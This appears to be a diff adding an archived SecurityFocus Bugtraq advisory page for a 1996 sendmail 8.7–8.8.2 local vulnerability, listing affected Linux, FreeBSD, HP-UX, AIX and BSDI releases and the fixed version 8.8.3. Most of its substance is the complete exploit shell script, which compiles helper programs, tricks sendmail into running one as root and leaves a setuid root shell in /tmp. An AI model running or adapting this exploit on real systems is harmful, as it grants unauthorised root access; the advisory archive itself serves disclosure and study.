@@ -1,0 +1,136 @@
+#bid716<p><b><span style="font-size: 18pt;">Berkeley Sendmail Daemon Mode Vulnerability</span></b></p><br><br><a href="http://www.securityfocus.com/bid/716/info">info</a><br><a href="http://www.securityfocus.com/bid/716/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/716/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/716/solution">solution</a><br><a href="http://www.securityfocus.com/bid/716/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				716
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Input Validation Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Nov 16 1996 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Nov 16 1996 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				This vulnerability was discovered by Leshka Zakharoff &lt;leshka@leshka.chuvashia.su&gt; and posted to Bugtraq on 16 November 1996.
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					Redhat Linux 4.0 <br/>
+					
+				
+					IBM AIX 4.2 <br/>
+					
+				
+					HP HP-UX 10.20 <br/>
+					
+				
+					HP HP-UX 10.10 <br/>
+					
+				
+					HP HP-UX 10.0 1<br/>
+					
+				
+					HP HP-UX 10.0 <br/>
+					
+				
+					FreeBSD FreeBSD 2.1.6 <br/>
+					
+				
+					FreeBSD FreeBSD 2.1.5 <br/>
+					
+				
+					Eric Allman Sendmail 8.8.2 <br/>
+					
+				
+					Eric Allman Sendmail 8.8.1 <br/>
+					
+				
+					Eric Allman Sendmail 8.8 <br/>
+					
+				
+					Eric Allman Sendmail 8.7 .x<br/>
+					
+				
+					Caldera Network Desktop 1.0 <br/>
+					
+				
+					BSDI BSD/OS 2.1 <br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+				
+					Eric Allman Sendmail 8.8.3 <br/>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	This exploit was posted to Bugtraq by Leshka Zakharoff &lt;leshka@leshka.chuvashia.su&gt; on 16 November 1996.<br/><br/>#!/bin/sh<br/>#<br/>#<br/>#                                   Hi !<br/>#                This is exploit for sendmail smtpd bug<br/>#    (ver. 8.7-8.8.2 for FreeBSD, Linux and may be other platforms).<br/>#         This shell script does a root shell in /tmp directory.<br/>#          If you have any problems with it, drop me a letter.<br/>#                                Have fun !<br/>#<br/>#<br/>#                           ----------------------<br/>#               ---------------------------------------------<br/>#    -----------------   Dedicated to my beautiful lady   ------------------<br/>#               ---------------------------------------------<br/>#                           ----------------------<br/>#<br/>#          Leshka Zakharoff, 1996. E-mail: leshka@leshka.chuvashia.su<br/>#<br/>#<br/>#<br/>echo   'main()                                                '&gt;&gt;leshka.c<br/>echo   '{                                                     '&gt;&gt;leshka.c<br/>echo   '  execl("/usr/sbin/sendmail","/tmp/smtpd",0);         '&gt;&gt;leshka.c<br/>echo   '}                                                     '&gt;&gt;leshka.c<br/>#<br/>#<br/>echo   'main()                                                '&gt;&gt;smtpd.c<br/>echo   '{                                                     '&gt;&gt;smtpd.c<br/>echo   '  setuid(0); setgid(0);                               '&gt;&gt;smtpd.c<br/>echo   '  system("cp /bin/sh /tmp;chmod a=rsx /tmp/sh");      '&gt;&gt;smtpd.c<br/>echo   '}                                                     '&gt;&gt;smtpd.c<br/>#<br/>#<br/>cc -o leshka leshka.c;cc -o /tmp/smtpd smtpd.c<br/>./leshka<br/>kill -HUP `ps -ax|grep /tmp/smtpd|grep -v grep|tr -d ' '|tr -cs ":digit:" "\n"|head -n 1`<br/>rm leshka.c leshka smtpd.c /tmp/smtpd<br/>/tmp/sh
+	
+		<ul>
+</ul>
+</div>
